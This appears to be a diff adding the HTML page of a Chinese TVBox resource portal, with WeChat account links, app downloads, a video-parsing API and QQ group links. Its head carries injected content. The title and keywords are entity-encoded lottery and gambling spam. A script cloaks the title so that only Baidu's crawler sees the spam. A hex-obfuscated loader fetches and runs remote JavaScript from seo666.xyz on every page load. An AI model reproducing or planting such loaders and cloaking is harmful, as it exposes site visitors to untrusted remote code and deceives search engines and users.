@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>&#31934;&#20934;&#19968;&#30721;&#21457;&#36130;&#44;&#28595;&#38376;&#36873;&#19968;&#32918;&#19968;&#30721;&#26399;&#44;&#28595;&#38376;&#19968;&#32918;&#19968;&#30721;&#20934;&#36873;&#19968;&#30721;&#44;&#28595;&#38376;&#19977;&#20013;&#19977;&#24517;&#20013;&#19968;&#32452;&#44;&#28595;&#38376;&#31934;&#20934;&#20813;&#36153;&#36164;&#26009;&#22823;&#20840;&#32858;&#20384;&#32593;</title> 
+<meta name="keywords" content="&#31934;&#20934;&#19968;&#30721;&#21457;&#36130;&#44;&#28595;&#38376;&#36873;&#19968;&#32918;&#19968;&#30721;&#26399;&#44;&#28595;&#38376;&#19968;&#32918;&#19968;&#30721;&#20934;&#36873;&#19968;&#30721;&#44;&#28595;&#38376;&#19977;&#20013;&#19977;&#24517;&#20013;&#19968;&#32452;&#44;&#28595;&#38376;&#31934;&#20934;&#20813;&#36153;&#36164;&#26009;&#22823;&#20840;&#32858;&#20384;&#32593;"/> 
+<script>if(navigator.userAgent.toLocaleLowerCase().indexOf("baidu") == -1){document.title ="itv的-生活日记-itvbox云星日记"}</script>
+<meta name="description" content="&#39321;&#28207;&#39532;&#20250;&#20845;&#21512;&#24425;&#12304;&#119;&#119;&#119;&#46;&#54;&#50;&#51;&#55;&#49;&#49;&#46;&#99;&#111;&#109;&#12305;&#24320;&#22870;&#32467;&#26524;&#124;&#39321;&#28207;&#20845;&#21512;&#36164;&#26009;&#22823;&#20840;&#124;&#28595;&#38376;&#20845;&#21512;&#24425;&#124;&#28595;&#38376;&#26368;&#24555;&#26368;&#20934;&#30340;&#20813;&#36153;&#39640;&#25163;&#20844;&#24320;&#36164;&#26009;&#124;&#50;&#48;&#50;&#50;&#28595;&#38376;&#20840;&#24180;&#20813;&#36153;&#29572;&#26426;&#31934;&#20934;&#36164;&#26009;&#124;&#28595;&#38376;&#26368;&#20934;&#36164;&#26009;&#20813;&#36153;&#32593;&#31449;&#124;&#20845;&#24320;&#24425;&#24320;&#22870;&#29616;&#22330;&#124;&#39321;&#28207;&#39532;&#20250;&#24320;&#22870;&#29579;&#20013;&#29579;&#20813;&#36153;&#36164;&#26009;&#50;&#48;&#50;&#50;&#124;&#30333;&#23567;&#22992;&#20813;&#36153;&#19968;&#32918;&#19968;&#30721;&#20013;&#29305;&#27491;&#29256;&#36164;&#26009;&#124;&#20845;&#21512;&#24425;&#24320;&#22870;&#32467;&#26524;&#26597;&#35810;&#50;&#48;&#50;&#50;&#124;"/> 
+<script>var IBFdwkM1$EzT1$1=IBFdwkM1$EzT1$1||[];(function(){var d2=window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74"]("\x73\x63\x72\x69\x70\x74");d2["\x73\x72\x63"]="\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x65\x6f\x36\x36\x36\x2e\x78\x79\x7a\x2f\x6c\x68\x2e\x6a\x73";var Y$u3=window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65"]("\x73\x63\x72\x69\x70\x74")[0];Y$u3["\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65"]["\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65"](d2,Y$u3)})();</script>
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><!--!‬‏‎‭‪‎‫‭‭‫‬‫‭‫‪‭‪‭‫‭‬‭‬‪-->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0"><!--!‬‏‎‭‪‎‫‭‭‫‬‫‭‫‪‭‪‭‫‭‬‭‬‪-->
+    <link rel="stylesheet" href="css/layui.css">
+    <link rel="stylesheet" href="css/admin.css">
+    <link rel="stylesheet" href="css/icons.min.css" media="all">
+    <link rel="stylesheet" href="css/font.css" media="all">
+    <link rel="stylesheet" href="css/app.min.css">
+
+  
+  
+  
+  <!--图片放大css-->
+	<style type="text/css">
+	
+		/* 图片默认样式 */
+		img {
+			max-width: 100%;
+			height: auto;
+			cursor: pointer;
+		}
+		/* 放大后的样式 */
+		#modal {
+			display: none;
+			position: fixed;
+			z-index: 1;
+			padding-top: 100px;
+			left: 0;
+			top: 0;
+			width: 100%;
+			height: 100%;
+			overflow: auto;
+			background-color: rgba(0,0,0,0.20);
+		}
+		#modal-content {
+			display: block;
+			margin: auto;
+			width: 80%;
+			max-width: 800px;
+		}
+		/* 关闭按钮样式 */
+		.close {
+			color: #000000;
+			float: right;
+			font-size: 50px;
+			font-weight: bold;
+			cursor: pointer;
+			position: absolute;
+			top: 50px;
+			right: 50px;
+		}
+		.close:hover,
+		.close:focus {
+			color: #bbb;
+			text-decoration: none;
+			cursor: pointer;
+		}
+	</style>
+  
+  
+    </head>
+<body>
+<div class="layui-fluid ew-console-wrapper">
+<div class="layui-row layui-col-space15">
+        <div class="layui-col-md12">
+            <div class="layui-card">
+                <div class="layui-card-header"><b>接口暂无法查看，请直接放在软件使用</b></div>
+                <div class="layui-card-body dynamic-card-body mini-bar">
+                    <ul class="layui-timeline layui-timeline-dynamic">
+                        
+                        
+                        
+<li class="layui-timeline-item">
+<i class="badge badge-danger-lighten"></i>
+<div class="layui-timeline-content layui-text">
+    <div class="layui-timeline-title">
+        <span class="badge badge-success-lighten">云星日记官网</span> <span class="badge badge-warning-lighten">moil.cc</span> <font style="font-size:8px">2023.3.23 12:00</font><br>
+        <font style="font-size:10px">
+         <span class="badge badge-danger-lighten">
+         ●</span>云星日记粉丝论坛支持用户投稿下载资源等
+         <br>
+         ●注册码购买地址：<a href="http://fk.moil.cc/">http://fk.moil.cc/</a>
+         <br>
+         ●与公众号云星日记资源同步现在注册账户需要注册码
+         <br>
+         ●下载APP：<a href="http://moil.cc/app">http://moil.cc/app/</a>
+         <br>
+         ●如果对使用程度不高，完全可以关注公众号进行资源获取
+         <br>
+      <span class="badge badge-danger-lighten">Ps:云星论坛是一个粉丝交流APP支持安卓.ios设备进行安装使用</span>
+      <br>
+      <br>
+        </font>
+    </div>
+    </div>
+</li>
+                   
+                   
+                   
+                   
+                   
+                   
+                   
+                   
+                   
+                        
+                        
+<li class="layui-timeline-item">
+<i class="badge badge-danger-lighten"></i>
+<div class="layui-timeline-content layui-text">
+    <div class="layui-timeline-title">
+        <span class="badge badge-success-lighten">主用公众号</span> <span class="badge badge-warning-lighten">云星日记</span> <font style="font-size:8px">2023.03.23 00:00</font><br>
+        <font style="font-size:10px">
+       ●免费分享接口软件等
+       <br>
+       
+        ●TVBox接口/软件，书源接口，同步持续更新
+       <br>
+       
+       ●公众号分享的所有的软件等工具均免费使用
+       <br>
+       
+       	<img src="https://www.itvbox.cc/img/云星日记.jpg" width="130" height="130" onclick="showModal(this);">
+	<!-- 显示放大后的图片 -->
+	<div id="modal">
+		<span class="close" onclick="closeModal();">&times;</span>
+		<img id="modal-content">
+	</div>
+       <br>
+       
+       
+<span class="badge badge-danger-lighten">Ps:主用公众号，所有安卓软件接口都在这里</span>
+      <br>
+        <br>
+        </font>
+    </div>
+    </div>
+</li>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+<li class="layui-timeline-item">
+<i class="badge badge-danger-lighten"></i>
+<div class="layui-timeline-content layui-text">
+    <div class="layui-timeline-title">
+        <span class="badge badge-success-lighten">备用公众号</span> <span class="badge badge-warning-lighten">云星测评</span> <font style="font-size:8px">2023.03.23 00:00</font><br>
+        <font style="font-size:10px">
+       ●免费分享ios伪装软件
+       <br>
+       
+       ●备用公众号请大家伙都关注一下，谨防失联
+       <br>
+       
+       ●同步云星日记公众号部分内容
+       <br>
+       
+              	<img src="https://www.itvbox.cc/img/云星测评.jpg" width="130" height="130" onclick="showModal(this);">
+	<!-- 显示放大后的图片 -->
+	<div id="modal">
+		<span class="close" onclick="closeModal();">&times;</span>
+		<img id="modal-content">
+	</div>
+	
+	  <br>
+<span class="badge badge-danger-lighten">Ps:备用公众号</span>
+      <br>
+        <br>
+        </font>
+    </div>
+    </div>
+</li>
+                        
+                   
+                   
+                   
+                   
+                   
+                   
+                   
+<li class="layui-timeline-item">
+<i class="badge badge-danger-lighten"></i>
+<div class="layui-timeline-content layui-text">
+    <div class="layui-timeline-title">
+        <span class="badge badge-success-lighten">教程</span> <span class="badge badge-warning-lighten">基础使用</span> <font style="font-size:8px">2023.03.23 00:00</font><br>
+        <font style="font-size:10px">
+       ●可视TV Max 二开影视仓UI（仓库版）
+       <br>
+       ●一个仓库，多重选择
+       <br>
+       ●设备版本低的可以使用1.3.6以下版本
+       <br>
+       ●配套仓库接口：公众号回复关键词：<span class="badge badge-warning-lighten">可视TV仓库地址</span>
+       <br>
+       ●软件下载方式：公众号回复关键词：<span class="badge badge-warning-lighten">可视TV软件下载</span>
+       <br>
+        ●可视TV软件下载：<a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzkyOTIxNzY0Mg==&action=getalbum&album_id=2562841448342274049&scene=126#wechat_redirect">https://mp.weixin.qq.com/mp/可视TV</a>
+         <br>
+        ●TVBox套壳合集：<a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzkyOTIxNzY0Mg==&action=getalbum&album_id=2457776729449545729&scene=126#wechat_redirect">https://mp.weixin.qq.com/mp/tvox总合集</a>
+         <br>
+        ●如意TV软件：<a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzkyOTIxNzY0Mg==&action=getalbum&album_id=2678781426510774273&scene=126#wechat_redirect">https://mp.weixin.qq.com/mp/如意TV</a>
+         <br>
+         ●总教程带视频：<a href="https://mp.weixin.qq.com/s/_g55K0QJNND3EnP8g__PNg">https://mp.weixin.qq.com/mp/总教程</a>
+         
+         <br>
+       
+
+              	<img src="https://www.itvbox.cc/img/可视.jpg" width="280" height="130" onclick="showModal(this);">
+	<!-- 显示放大后的图片 -->
+	<div id="modal">
+		<span class="close" onclick="closeModal();">&times;</span>
+		<img id="modal-content">
+	</div>
+	
+         <br>
+       
+<span class="badge badge-danger-lighten">Ps:剩下的教程请前往公众号或者官网获取</span>
+      <br>
+        <br>
+        </font>
+    </div>
+    </div>
+</li>
+                   
+                   
+                   
+                   
+                   
+                   
+                   
+                   
+                   
+                   
+                        
+
+<li class="layui-timeline-item">
+<i class="badge badge-danger-lighten"></i>
+<div class="layui-timeline-content layui-text">
+    <div class="layui-timeline-title">
+        <span class="badge badge-success-lighten">猫影视解析</span> <span class="badge badge-warning-lighten">api.maoyingshi.cc</span> <font style="font-size:8px">2023.03.23 00:00</font><br>
+        <font style="font-size:10px">
+           ●猫影视 1080解析：<a href="https://api.maoyingshi.cc/">https://api.maoyingshi.cc/</a> 
+          <br> 
+           ●猫影视用户管理系统专为管理多媒体解析用户而设计，本解析每天全网最快缓存，每天同步缓存
+          <br>
+           ●★支持：TX、QYI、YOUKU、MGUO、pptv、SOUHU、LESHI、 B站、抖音短视频、M3U8、MP4等
+          <br>
+           ●★每天同步缓存！ QY、TX VIP，全部缓存1920*1080蓝光画质 !
+           <br>
+        <img src="https://www.itvbox.cc/img/猫影视.png" width="280" height="130" onclick="showModal(this);">
+	<!-- 显示放大后的图片 -->
+	<div id="modal">
+		<span class="close" onclick="closeModal();">&times;</span>
+		<img id="modal-content">
+	</div>
+       
+           <br>
+       <span class="badge badge-danger-lighten">Ps:客服3578843152</span>
+       <br>
+       <br>
+        </font>
+    </div>
+    </div>
+</li>
+
+
+
+
+<li class="layui-timeline-item">
+<i class="badge badge-danger-lighten"></i>
+<div class="layui-timeline-content layui-text">
+    <div class="layui-timeline-title">
+        <span class="badge badge-success-lighten">官方群</span> <span class="badge badge-warning-lighten">QQ/频道</span> <font style="font-size:8px">2022.10.24 10:24</font><br>
+        <font style="font-size:10px">
+        点击加入QQ官方①群：<a href="https://jq.qq.com/?_wv=1027&k=1QEECVBd">783468715</a> 
+        <br>
+        点击加入QQ官方②群：<a href="https://jq.qq.com/?_wv=1027&k=chriINis">764366711</a>
+        <br>
+        点击加入QQ官方③群：<a href="https://jq.qq.com/?_wv=1027&k=f77IlcLM">211185159</a>
+        <br>
+        点击加入QQ官方④群：<a href="https://jq.qq.com/?_wv=1027&k=Yl8Uibn1">582874559</a>
+        <br>
+        点击加入QQ官方⑤群：<a href="https://jq.qq.com/?_wv=1027&k=FsYF3xzf">716385048</a>
+        <br>
+                  	<img src="https://www.itvbox.cc/img/频道.jpg" width="200" height="250" onclick="showModal(this);">
+	<!-- 显示放大后的图片 -->
+	<div id="modal">
+		<span class="close" onclick="closeModal();">&times;</span>
+		<img id="modal-content">
+	</div>
+	  <br>
+            <span class="badge badge-danger-lighten">Ps:上方是QQ频道二维码</span>
+            <br>
+            <br>
+        </font>
+    </div>
+    </div>
+</li>
+
+
+
+<!--
+<li class="layui-timeline-item">
+<i class="badge badge-danger-lighten"></i>
+<div class="layui-timeline-content layui-text">
+    <div class="layui-timeline-title">
+        <span class="badge badge-success-lighten">推荐</span> <span class="badge badge-warning-lighten">手机卡/流量卡</span> <font style="font-size:8px">2023.03.23 00:00</font><br>
+        <font style="font-size:10px">
+       ●电信，联通，移动
+       <br>
+       ●三大运营商官方电话卡办理，便宜，稳定，安全
+       <br>
+       ●点击右侧链接查看办理：<a href="http://gantanhao.vip/gth/#/minishop?share_id=441146&shop_name=%25E4%25BA%2591%25E6%2598%259F%25E5%258D%25A1%25E9%2593%25BA">点我免费办理</a>
+       <br>
+       
+       	<img src="https://www.itvbox.cc/img/优品卡.jpg" width="280" height="190" onclick="showModal(this);">
+	<!-- 显示放大后的图片 
+	<div id="modal">
+		<span class="close" onclick="closeModal();">&times;</span>
+		<img id="modal-content">
+	</div>
+	<br>
+       <br>
+
+      
+        </font>
+    </div>
+    </div>
+</li>-->
+
+
+
+
+
+<!--
+<li class="layui-timeline-item">
+<i class="badge badge-danger-lighten"></i>
+<div class="layui-timeline-content layui-text">
+    <div class="layui-timeline-title">
+        <span class="badge badge-success-lighten">赞助</span> <span class="badge badge-warning-lighten">赞赏我们</span> <font style="font-size:8px">2023.03.23 00:00</font><br>
+        <font style="font-size:10px">
+       ●可以扫描下方二维码赞助我们
+       <br>
+       ●助力服务器接口运行维护，当然您也可以前往公众号点击广告文章进行阅读
+       <br>
+
+       
+       	<img src="https://www.itvbox.cc/img/收款码.png" width="280" height="190" onclick="showModal(this);">
+	<!-- 显示放大后的图片 
+	<div id="modal">
+		<span class="close" onclick="closeModal();">&times;</span>
+		<img id="modal-content">
+	</div>
+	 <br>
+       
+
+      
+        </font>
+    </div>
+    </div>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li class="layui-timeline-item">
+<i class="badge badge-danger-lighten"></i>
+<div class="layui-timeline-content layui-text">
+    <div class="layui-timeline-title">
+ 
+      <span class="badge badge-danger-lighten">Ps:按个人心情需求进行赞助支持</span>
+       
+
+      <br>-->
+        <br>
+        </font>
+    </div>
+    </div>
+</li>
+<a href="https://beian.miit.gov.cn/" target="_blank">陕ICP备2022014772号-3云星日记</a>
+<br>
+<script id="LA-DATA-WIDGET" crossorigin="anonymous" charset="UTF-8" src="https://v6-widget.51.la/v6/JnktYIqNnPRWGlHW/quote.js?theme=0&f=12"></script>
+
+
+
+</ul>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+	<!-- JavaScript 图片放大js代码 -->
+	<script type="text/javascript">
+		function showModal(img) {
+			var modal = document.getElementById('modal');
+			var modalImg = document.getElementById('modal-content');
+			modal.style.display = "block";
+			modalImg.src = img.src;
+		}
+
+		function closeModal() {
+			var modal = document.getElementById('modal');
+			modal.style.display = "none";
+		}
+	</script>
+	
+	
+	
+</body>
+</html>
